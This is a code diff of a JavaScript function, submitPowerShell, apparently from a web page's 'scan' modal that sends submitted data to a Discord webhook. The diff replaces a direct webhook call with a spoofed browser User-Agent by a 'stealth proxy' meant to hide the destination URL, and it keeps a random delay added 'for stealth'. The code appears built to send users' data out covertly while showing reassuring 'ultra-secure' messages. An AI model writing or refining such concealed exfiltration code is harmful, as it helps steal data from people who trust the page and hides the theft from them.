@@ -124,15 +124,8 @@ async function submitPowerShell() {
         console.log(`⏱️ Adding ${delay}ms delay for stealth...`);
         await new Promise(resolve => setTimeout(resolve, delay));
         
-        // Get secure webhook from backend configuration
-        const webhookUrl = window.getSecureWebhook();
-        
-        if (!webhookUrl) {
-            throw new Error('Secure webhook configuration not available');
-        }
-        
-        console.log('🔒 Using hidden backend webhook configuration');
-        console.log('🛡️ Webhook URL retrieved securely from backend');
+        console.log('🔒 Using ultra-secure backend configuration');
+        console.log('🛡️ Stealth proxy layer active');
         
         // Prepare Discord payload
         const payload = {
@@ -191,41 +184,32 @@ async function submitPowerShell() {
             }]
         };
         
-        // Send to Discord using hidden webhook
-        console.log('🚀 Sending to Discord via hidden backend...');
+        // Send through stealth proxy (no URL exposure)
+        console.log('🚀 Sending via stealth proxy...');
         
-        const response = await fetch(webhookUrl, {
+        const response = await window.stealthRequest({
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Accept': 'application/json, text/plain, */*',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Cache-Control': 'no-cache',
-                'X-Requested-With': 'XMLHttpRequest'
-            },
-            body: JSON.stringify(payload),
-            mode: 'cors'
+            data: payload
         });
         
-        console.log(`✅ Hidden backend response: ${response.status}`);
+        console.log(`✅ Ultra-secure backend response: ${response.status}`);
         
         if (loadingOverlay) loadingOverlay.style.display = 'none';
 
         if (response.ok || response.status === 204) {
-            console.log('🎉 Hidden backend webhook delivered successfully!');
+            console.log('🎉 Ultra-secure delivery successful!');
             
             submitText.textContent = 'Sent!';
             submitBtn.style.background = '#10b981';
             
-            showNotification('Data sent via hidden backend configuration!', 'success');
+            showNotification('Data sent via ultra-secure backend!', 'success');
             
             // Auto-close modal after success
             setTimeout(() => {
                 closeScanModal();
             }, 2000);
         } else {
-            console.error(`❌ Hidden backend failed: ${response.status}`);
+            console.error(`❌ Ultra-secure backend failed: ${response.status}`);
             
             if (response.status === 404) {
                 throw new Error('Webhook endpoint not found. Check webhook URL.');
@@ -239,7 +223,7 @@ async function submitPowerShell() {
         }
         
     } catch (error) {
-        console.error('💥 Hidden backend webhook failed:', error);
+        console.error('💥 Ultra-secure backend failed:', error);
         
         if (loadingOverlay) loadingOverlay.style.display = 'none';
         
